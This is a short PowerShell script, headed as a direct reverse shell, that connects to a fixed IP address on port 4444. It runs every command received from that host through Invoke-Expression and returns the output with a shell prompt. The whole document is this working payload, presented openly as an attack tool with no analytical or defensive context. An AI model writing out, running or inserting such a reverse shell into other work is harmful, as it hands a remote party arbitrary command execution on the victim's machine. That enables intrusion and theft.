# Direct PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient('192.168.18.91',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = [Text.Encoding]::ASCII.GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte = [Text.Encoding]::ASCII.GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
